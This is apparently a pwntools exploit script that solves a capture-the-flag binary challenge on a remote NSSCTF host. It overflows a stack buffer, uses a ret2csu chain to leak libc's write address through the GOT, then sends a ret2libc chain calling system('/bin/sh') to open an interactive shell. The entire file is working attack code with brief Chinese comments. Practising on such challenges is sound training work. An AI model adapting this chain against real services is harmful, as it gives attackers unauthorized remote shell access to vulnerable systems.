#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

# context.log_level = "debug"

p = remote("node6.anna.nssctf.cn", 22649)
elf = ELF("./pwn-ubuntu_20.04/src/attachment")
_libc = ELF('./pwn-ubuntu_20.04/src/libc.so.6')

start_address = elf.symbols['main']
ret_address = 0x4012B4
pop_rdi = 0x4012b3
csu_mov = 0x401290
csu_pop_rbx = 0x4012AA
system_offset = _libc.symbols['system']
str_bin_sh_offset = _libc.search(b'/bin/sh').__next__()
write_offset = _libc.symbols['write']

function_name = 'write'
plt_address = elf.plt['write']    #获取函数的plt表地址
got_address = elf.got[function_name]    #获取函数的got表地址
write_got_address = elf.got['write']
#获取_start函数的地址是为了方便一会返回到此处，进行第二次栈溢出。   

# 64位
context(arch="amd64",os="linux")
stack_len = 0x100 + 0x8

#获取got地址
#函数调用参数存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器
def csu(rbx, rbp, r12, r13, r14, r15, target_address):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r15 should be the function we want to call
    # rdi=edi=r12d  
    # rsi=r13
    # rdx=r14
    payload = p64(csu_pop_rbx) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(csu_mov) + p64(0) * 7 + p64(target_address)
    return payload

payload = b'\x00'*stack_len + csu(0, 1, 1, got_address, 8, write_got_address, start_address)

p.sendline(payload)
p.recvuntil(b"Ok.\n")
write_addr = u64(p.recvline()[:8].ljust(8,b'\0'))
print(function_name + "_func_addr =",hex(write_addr))

# p.interactive() #can can need

#注入system函数
libc_base = write_addr - write_offset
payload = b'\x00'*stack_len + p64(ret_address) + p64(pop_rdi) + p64(libc_base + str_bin_sh_offset) + p64(libc_base + system_offset)

p.sendline(payload)
p.interactive()